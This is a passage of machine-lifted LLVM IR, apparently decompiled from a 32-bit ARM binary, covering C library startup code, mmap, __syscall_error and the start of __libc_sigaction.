  %v2_133fc = call i32 @__check_one_fd(i32 2, i32 %v0_133f4)
  store i32 %v2_133fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13400

dec_label_pc_13400:                               ; preds = %dec_label_pc_133c8, %dec_label_pc_133b0, %dec_label_pc_133d8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_13408 = load i32, i32* %arg3, align 4
  store i32 %v2_13408, i32* %r2.global-to-local, align 4
  %v2_1340c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1340c, i32* %r1.global-to-local, align 4
  %v3_13410 = add i32 %v2_1340c, 260
  %v4_13410 = inttoptr i32 %v3_13410 to i32*
  store i32 %v2_13408, i32* %v4_13410, align 4
  %v0_13414 = load i32, i32* %r0.global-to-local, align 4
  %v1_13414 = inttoptr i32 %v0_13414 to i32*
  %v2_13414 = load i32, i32* %v1_13414, align 4
  store i32 %v2_13414, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13418 = icmp eq i32 %v2_13414, 0
  store i1 %v2_13418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13418, label %bb84, label %dec_label_pc_13420

dec_label_pc_13420:                               ; preds = %dec_label_pc_13400
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_13424 = load i32, i32* %r1.global-to-local, align 4
  %v2_13424 = add i32 %v0_13424, 164
  %v3_13424 = inttoptr i32 %v2_13424 to i32*
  %v4_13424 = load i32, i32* %v3_13424, align 4
  store i32 %v4_13424, i32* %r3.global-to-local, align 4
  %v2_13428 = inttoptr i32 %v4_13424 to i32*
  store i32 %v2_13414, i32* %v2_13428, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_13430 = load i32, i32* %r0.global-to-local, align 4
  %v1_13430 = inttoptr i32 %v0_13430 to i32*
  %v2_13430 = load i32, i32* %v1_13430, align 4
  store i32 %v2_13430, i32* %r0.global-to-local, align 4
  %v4_13434 = call i32 @__GI_strrchr(i32 %v2_13430, i32 47, i32 %v2_13408, i32 %v4_13424)
  store i32 %v4_13434, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1343c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1343c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13440 = icmp eq i32 %v4_13434, 0
  store i1 %v2_13440, i1* %cpsr_z.global-to-local, align 1
  %v2_13444 = add i32 %v2_1343c, 96
  %v3_13444 = inttoptr i32 %v2_13444 to i32*
  %v4_13444 = load i32, i32* %v3_13444, align 4
  store i32 %v4_13444, i32* %r2.global-to-local, align 4
  br i1 %v2_13440, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_13420
  %v2_1344c58 = inttoptr i32 %v4_13444 to i32*
  store i32 0, i32* %v2_1344c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_13420
  %v2_13448 = add i32 %v4_13434, 1
  store i32 %v2_13448, i32* %r3.global-to-local, align 4
  %v2_1344c = inttoptr i32 %v4_13444 to i32*
  store i32 %v4_13434, i32* %v2_1344c, align 4
  %v1_13450 = load i32, i32* %r3.global-to-local, align 4
  %v2_13450 = load i32, i32* %r2.global-to-local, align 4
  %v3_13450 = inttoptr i32 %v2_13450 to i32*
  store i32 %v1_13450, i32* %v3_13450, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_13400
  %v2_13460 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13460, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1346c = add i32 %v2_13460, -12
  store i32 %v2_1346c, i32* %r5.global-to-local, align 4
  store i32 2000, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1347c = add i32 %v2_13460, 2000
  %v4_1347c = inttoptr i32 %v3_1347c to i32*
  store i32 %arg5, i32* %v4_1347c, align 4
  %v0_1349418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1349419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1349421 = icmp uge i32 %v0_1349418, %v1_1349419
  store i1 %v3_1349421, i1* %cpsr_c.global-to-local, align 1
  %v9_1349427 = icmp eq i32 %v0_1349418, %v1_1349419
  store i1 %v9_1349427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1349421, label %dec_label_pc_134c8.lr.ph, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %bb84, %dec_label_pc_13484
  %v1_13484 = phi i32 [ %v1_13490, %dec_label_pc_13484 ], [ %v0_1349418, %bb84 ]
  %v0_13484 = load i32, i32* %r5.global-to-local, align 4
  %v2_13484 = and i32 %v1_13484, 1073741824
  %v3_13484 = icmp ne i32 %v2_13484, 0
  store i1 %v3_13484, i1* %cpsr_c.global-to-local, align 1
  %v4_13484 = mul i32 %v1_13484, 4
  %v5_13484 = add i32 %v4_13484, %v0_13484
  %v6_13484 = inttoptr i32 %v5_13484 to i32*
  %v7_13484 = load i32, i32* %v6_13484, align 4
  store i32 %v7_13484, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13484)
  %v0_13490 = load i32, i32* %r4.global-to-local, align 4
  %v1_13490 = add i32 %v0_13490, 1
  store i32 %v1_13490, i32* %r4.global-to-local, align 4
  %v1_13494 = load i32, i32* %r7.global-to-local, align 4
  %v3_13494 = icmp uge i32 %v1_13490, %v1_13494
  store i1 %v3_13494, i1* %cpsr_c.global-to-local, align 1
  %v9_13494 = icmp eq i32 %v1_13490, %v1_13494
  store i1 %v9_13494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13494, label %dec_label_pc_134c8.lr.ph, label %dec_label_pc_13484

dec_label_pc_134c8.lr.ph:                         ; preds = %dec_label_pc_13484, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1349c = icmp eq i32 %v0_132e8, 0
  store i1 %v2_1349c, i1* %cpsr_z.global-to-local, align 1
  %v2_134a4 = xor i1 %v2_1349c, true
  call void @__pseudo_cond_branch(i1 %v2_134a4, i32 %v0_132e8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_134b0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_134bc = add i32 %v2_134b0, -12
  store i32 %v2_134bc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_134c8

dec_label_pc_134c8:                               ; preds = %dec_label_pc_134c8.dec_label_pc_134c8_crit_edge, %dec_label_pc_134c8.lr.ph
  %v1_134c8 = phi i32 [ %v1_134d4, %dec_label_pc_134c8.dec_label_pc_134c8_crit_edge ], [ 0, %dec_label_pc_134c8.lr.ph ]
  %v0_134c8 = phi i32 [ %v0_134c8.pre, %dec_label_pc_134c8.dec_label_pc_134c8_crit_edge ], [ %v2_134bc, %dec_label_pc_134c8.lr.ph ]
  %v2_134c8 = and i32 %v1_134c8, 1073741824
  %v3_134c8 = icmp ne i32 %v2_134c8, 0
  store i1 %v3_134c8, i1* %cpsr_c.global-to-local, align 1
  %v4_134c8 = mul i32 %v1_134c8, 4
  %v5_134c8 = add i32 %v4_134c8, %v0_134c8
  %v6_134c8 = inttoptr i32 %v5_134c8 to i32*
  %v7_134c8 = load i32, i32* %v6_134c8, align 4
  store i32 %v7_134c8, i32* %ip.global-to-local, align 4
  store i32 79060, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_134c8)
  %v0_134d4 = load i32, i32* @r4, align 4
  %v1_134d4 = add i32 %v0_134d4, 1
  store i32 %v1_134d4, i32* @r4, align 4
  %v1_134d8 = load i32, i32* @r7, align 4
  %v3_134d8 = icmp uge i32 %v1_134d4, %v1_134d8
  store i1 %v3_134d8, i1* %cpsr_c.global-to-local, align 1
  %v9_134d8 = icmp eq i32 %v1_134d4, %v1_134d8
  store i1 %v9_134d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_134d8, label %dec_label_pc_134e0, label %dec_label_pc_134c8.dec_label_pc_134c8_crit_edge

dec_label_pc_134c8.dec_label_pc_134c8_crit_edge:  ; preds = %dec_label_pc_134c8
  %v0_134c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134c8

dec_label_pc_134e0:                               ; preds = %dec_label_pc_134c8
  %v2_134e4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_134e4.pre, i32* %r0.global-to-local, align 4
  %v2_134e8 = add i32 %v2_134e4.pre, -68548
  store i32 %v2_134e8, i32* %r2.global-to-local, align 4
  store i32 %v2_134e8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_134f0 = icmp eq i32 %v2_134e8, 0
  store i1 %v2_134f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134f0, label %dec_label_pc_13508, label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134e0
  store i32 79104, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_134e8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13504 = load i32, i32* %r0.global-to-local, align 4
  %v2_13504 = inttoptr i32 %v1_13504 to i32*
  store i32 0, i32* %v2_13504, align 4
  %v2_1350c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_134e0, %dec_label_pc_134f8
  %v2_1350c = phi i32 [ %v2_134e4.pre, %dec_label_pc_134e0 ], [ %v2_1350c.pre, %dec_label_pc_134f8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1350c, i32* %r1.global-to-local, align 4
  %v2_13510 = add i32 %v2_1350c, 128
  %v3_13510 = inttoptr i32 %v2_13510 to i32*
  %v4_13510 = load i32, i32* %v3_13510, align 4
  store i32 %v4_13510, i32* %r2.global-to-local, align 4
  store i32 %v4_13510, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13518 = icmp eq i32 %v4_13510, 0
  store i1 %v2_13518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13518, label %dec_label_pc_13530, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13508
  store i32 79144, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13510)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1352c = load i32, i32* %r0.global-to-local, align 4
  %v2_1352c = inttoptr i32 %v1_1352c to i32*
  store i32 0, i32* %v2_1352c, align 4
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %dec_label_pc_13508, %dec_label_pc_13520
  %v2_13530 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_13530, i32* @r0, align 4
  %v1_13534 = call i32 @_setjmp(i32 %v2_13530)
  store i32 %v1_13534, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13538 = icmp eq i32 %v1_13534, 0
  store i1 %v2_13538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13538, label %dec_label_pc_13540, label %dec_label_pc_1358c

dec_label_pc_13540:                               ; preds = %dec_label_pc_13530
  %v0_13540 = call i32 @__aeabi_read_tp()
  store i32 %v0_13540, i32* %r0.global-to-local, align 4
  %v1_13544 = add i32 %v0_13540, -1168
  store i32 %v1_13544, i32* %r2.global-to-local, align 4
  %v2_1354c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1354c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_13558 = add i32 %v2_1354c, 56
  %v3_13558 = inttoptr i32 %v2_13558 to i32*
  %v4_13558 = load i32, i32* %v3_13558, align 4
  store i32 %v4_13558, i32* %ip.global-to-local, align 4
  store i32 %v2_13530, i32* %r3.global-to-local, align 4
  %v2_13568 = add i32 %v0_13540, -1040
  %v3_13568 = inttoptr i32 %v2_13568 to i32*
  store i32 %v2_13530, i32* %v3_13568, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_13574 = load i32, i32* %ip.global-to-local, align 4
  %v1_13574 = inttoptr i32 %v0_13574 to i32*
  %v2_13574 = load i32, i32* %v1_13574, align 4
  store i32 %v2_13574, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_13584 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_1358c:                               ; preds = %dec_label_pc_13530
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_13590 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13590, i32* %ip.global-to-local, align 4
  %v2_13594 = add i32 %v2_13590, 40
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  %v4_13594 = load i32, i32* %v3_13594, align 4
  store i32 %v4_13594, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13594)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_135a4 = load i32, i32* %stack_var_-416, align 4
  %v2_135a8 = add i32 %v2_135a4, 120
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  %v4_135a8 = load i32, i32* %v3_135a8, align 4
  store i32 %v4_135a8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_135ac

dec_label_pc_135ac:                               ; preds = %dec_label_pc_135e0.dec_label_pc_135ac_crit_edge, %dec_label_pc_1358c
  %v0_135ac = phi i32 [ %v0_135ac.pre, %dec_label_pc_135e0.dec_label_pc_135ac_crit_edge ], [ %v4_135a8, %dec_label_pc_1358c ]
  %v1_135ac = inttoptr i32 %v0_135ac to i32*
  %v2_135ac = load i32, i32* %v1_135ac, align 4
  store i32 %v0_135ac, i32* %r2.global-to-local, align 4
  store i32 %v2_135ac, i32* %r4.global-to-local, align 4
  %v1_135b8 = add i32 %v2_135ac, -1
  store i32 %v1_135b8, i32* %r1.global-to-local, align 4
  %v2_135bc89 = load i32, i32* %v1_135ac, align 4
  store i32 %v2_135bc89, i32* %r3.global-to-local, align 4
  %v3_135c091 = icmp uge i32 %v2_135bc89, %v2_135ac
  store i1 %v3_135c091, i1* %cpsr_c.global-to-local, align 1
  %v9_135c097 = icmp eq i32 %v2_135bc89, %v2_135ac
  store i1 %v9_135c097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135c097, label %dec_label_pc_135c8, label %dec_label_pc_135e0

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135ac, %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge
  %v0_135c898 = phi i32 [ %v1_135c0.pre, %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge ], [ %v2_135ac, %dec_label_pc_135ac ]
  store i32 %v0_135c898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_135d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_135d8, label %dec_label_pc_135dc, label %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge

dec_label_pc_135c8.dec_label_pc_135bc_crit_edge:  ; preds = %dec_label_pc_135c8
  %v0_135bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_135c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_135bc = inttoptr i32 %v0_135bc.pre to i32*
  %v2_135bc = load i32, i32* %v1_135bc, align 4
  store i32 %v2_135bc, i32* %r3.global-to-local, align 4
  %v3_135c0 = icmp uge i32 %v2_135bc, %v1_135c0.pre
  store i1 %v3_135c0, i1* %cpsr_c.global-to-local, align 1
  %v9_135c0 = icmp eq i32 %v2_135bc, %v1_135c0.pre
  store i1 %v9_135c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135c0, label %dec_label_pc_135c8, label %dec_label_pc_135e0

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135c8
  %v0_135dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_135dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135ac, %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge, %dec_label_pc_135dc
  %v0_135e8 = phi i32 [ %v0_135dc, %dec_label_pc_135dc ], [ %v2_135bc89, %dec_label_pc_135ac ], [ %v2_135bc, %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge ]
  %v1_135e0 = phi i32 [ %v0_135dc, %dec_label_pc_135dc ], [ %v2_135ac, %dec_label_pc_135ac ], [ %v1_135c0.pre, %dec_label_pc_135c8.dec_label_pc_135bc_crit_edge ]
  %v3_135e0 = icmp uge i32 %v0_135e8, %v1_135e0
  store i1 %v3_135e0, i1* %cpsr_c.global-to-local, align 1
  %v9_135e0 = icmp eq i32 %v0_135e8, %v1_135e0
  store i1 %v9_135e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135e0, label %dec_label_pc_135e8, label %dec_label_pc_135e0.dec_label_pc_135ac_crit_edge

dec_label_pc_135e0.dec_label_pc_135ac_crit_edge:  ; preds = %dec_label_pc_135e0
  %v0_135ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_135ac

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135e0
  %v2_135e8 = icmp ne i32 %v1_135e0, 0
  store i1 %v2_135e8, i1* %cpsr_c.global-to-local, align 1
  %v7_135e8 = icmp eq i32 %v1_135e0, 1
  store i1 %v7_135e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135e8, label %dec_label_pc_13628, label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135e8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_13628:                               ; preds = %dec_label_pc_135e8, %dec_label_pc_135f0, %dec_label_pc_13540
  %storemerge2 = phi i32 [ %v0_13584, %dec_label_pc_13540 ], [ 0, %dec_label_pc_135f0 ], [ 0, %dec_label_pc_135e8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1362c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1362c, i32* %r0.global-to-local, align 4
  %v0_13630 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13630, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_13628
  %v2_13630 = load i32, i32* %r4.global-to-local, align 4
  %v2_13634 = load i32, i32* @r8, align 4
  %v8_13634 = shl i32 %v2_13634, %v1_1362c
  %v9_13634 = and i32 %v8_13634, %v1_1362c
  %v8_13638 = lshr i32 %v2_13634, %v9_13634
  %v9_13638 = and i32 %v8_13638, %v9_13634
  %v2_1363c = inttoptr i32 %v9_13638 to i64*
  %v3_1363c = load i64, i64* %v2_1363c, align 4
  %v5_1363c = trunc i64 %v3_1363c to i32
  %v6_1363c = udiv i64 %v3_1363c, 4294967296
  %v7_1363c = trunc i64 %v6_1363c to i32
  store i32 %v5_1363c, i32* %r1.global-to-local, align 4
  %v9_1363c = sub i32 %v7_1363c, %v2_13630
  %v3_13640 = mul i32 %v9_1363c, %v2_13630
  %v5_13648 = mul i32 %v2_13630, 4
  %v5_1364c = udiv i32 %v2_13630, 2
  %v6_13648 = and i32 %v5_1364c, %v5_13648
  %v6_1364c = and i32 %v6_13648, %v3_13640
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1364c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13628, %bb85
  %v5_13650 = phi i32 [ %v1_1362c, %dec_label_pc_13628 ], [ %v6_1364c, %bb85 ]
  ret i32 %v5_13650

; uselistorder directives
  uselistorder i32 %v2_13630, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1362c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_135e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135dc, { 1, 0, 2 }
  uselistorder i32 %v1_135c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_135ac, { 1, 0 }
  uselistorder i32 %v2_1350c, { 1, 0 }
  uselistorder i32 %v2_134e4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_134d8, { 1, 0 }
  uselistorder i32 %v1_134d4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_134c8, { 1, 0 }
  uselistorder i32 %v1_13494, { 1, 0 }
  uselistorder i32 %v1_13490, { 1, 2, 3, 0 }
  uselistorder i32 %v1_13484, { 1, 0 }
  uselistorder i32 %v2_13460, { 1, 0, 2 }
  uselistorder i32 %v4_13444, { 1, 0, 2 }
  uselistorder i32 %v4_13434, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1337c, { 1, 2, 0 }
  uselistorder i32 %v2_13348, { 1, 2, 0 }
  uselistorder i32 %v1_13344, { 1, 2, 0 }
  uselistorder i1 %v2_13330, { 1, 0, 2 }
  uselistorder i32 %v5_13334, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13300, { 1, 0, 2, 3 }
  uselistorder i32 %v0_132e8, { 1, 0, 2 }
  uselistorder i32 %v2_132dc, { 1, 0, 2 }
  uselistorder i32 %v3_132ac, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 2, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 25, 24, 22, 23, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 2, 13, 14, 0, 15, 16, 17, 18, 19, 20, 25, 21, 22, 24, 23, 1, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 29, 24, 25, 28, 26, 27, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2004, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_13628, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_135c8, { 1, 0 }
  uselistorder label %dec_label_pc_13530, { 1, 0 }
  uselistorder label %dec_label_pc_13508, { 1, 0 }
  uselistorder label %dec_label_pc_13484, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13400, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133d8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_13348, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_13330, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1367c = load i32, i32* @r4, align 4
  store i32 %v3_1367c, i32* %stack_var_-16, align 4
  %v3_13688 = urem i32 %arg3, 4096
  %v2_1368c = icmp eq i32 %v3_13688, 0
  br i1 %v2_1368c, label %dec_label_pc_136b0, label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %entry
  %v0_13698 = call i32 @__aeabi_read_tp()
  store i32 %v0_13698, i32* %r0.global-to-local, align 4
  %v3_1369c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_1369c = sext i16 %v3_1369c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_136a8 = add i32 %v4_1369c, %v0_13698
  %v4_136a8 = inttoptr i32 %v3_136a8 to i32*
  store i32 22, i32* %v4_136a8, align 4
  %v0_136e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_136b0:                               ; preds = %entry
  %v0_136c0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136c0, -4095
  br i1 %tmp, label %dec_label_pc_136e0, label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136b0
  %v1_136cc = sub i32 0, %v0_136c0
  %v3_136d0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_136d0 = sext i16 %v3_136d0 to i32
  %v0_136d4 = call i32 @__aeabi_read_tp()
  %v3_136d8 = add i32 %v4_136d0, %v0_136d4
  %v4_136d8 = inttoptr i32 %v3_136d8 to i32*
  store i32 %v1_136cc, i32* %v4_136d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136b0, %dec_label_pc_136c8
  %v0_136e0 = phi i32 [ %v0_136c0, %dec_label_pc_136b0 ], [ -1, %dec_label_pc_136c8 ]
  store i32 %v0_136e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %dec_label_pc_13694, %dec_label_pc_136e0
  %v0_136e4 = phi i32 [ %v0_136e4.pre, %dec_label_pc_13694 ], [ %v0_136e0, %dec_label_pc_136e0 ]
  store i32 %v0_136e4, i32* %r0.global-to-local, align 4
  %v2_136e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_136e8, i32* @r4, align 4
  ret i32 %v0_136e4

; uselistorder directives
  uselistorder i32 %v0_136e4, { 1, 0 }
  uselistorder i32 %v0_136c0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_136e4, { 1, 0 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_136f8 = load i32, i32* @lr, align 4
  store i32 %v0_136f8, i32* %stack_var_-4, align 4
  %v0_13700 = load i32, i32* @r0, align 4
  %v3_13704 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13704 = sext i16 %v3_13704 to i32
  store i32 %v4_13704, i32* @r2, align 4
  %v0_13708 = call i32 @__aeabi_read_tp()
  %v1_1370c = sub i32 0, %v0_13700
  store i32 %v1_1370c, i32* @r3, align 4
  %v2_13710 = load i32, i32* @r2, align 4
  %v3_13710 = add i32 %v2_13710, %v0_13708
  %v4_13710 = inttoptr i32 %v3_13710 to i32*
  store i32 %v1_1370c, i32* %v4_13710, align 4
  %v2_13718 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_13718, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13724 = load i32, i32* @r4, align 4
  %v6_13724 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1372c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1372c, label %dec_label_pc_13780, label %dec_label_pc_13744

dec_label_pc_13744:                               ; preds = %entry
  %v1_13744 = add i32 %arg2, 4
